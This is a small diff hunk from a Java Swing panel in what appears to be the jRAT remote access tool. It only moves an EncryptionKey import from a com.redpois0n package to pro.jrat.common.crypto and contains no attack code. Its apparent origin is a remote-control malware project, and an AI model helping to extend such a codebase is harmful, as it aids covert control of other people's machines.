@@ -21,11 +21,11 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.table.DefaultTableModel;
 
 import pro.jrat.ErrorDialog;
+import pro.jrat.common.crypto.EncryptionKey;
 import pro.jrat.net.PortListener;
 import pro.jrat.ui.frames.FrameAddSocket;
 import pro.jrat.ui.renderers.table.SocketsTableRenderer;
 
-import com.redpois0n.common.crypto.EncryptionKey;
 
 @SuppressWarnings("serial")
 public class PanelMainSockets extends JPanel {
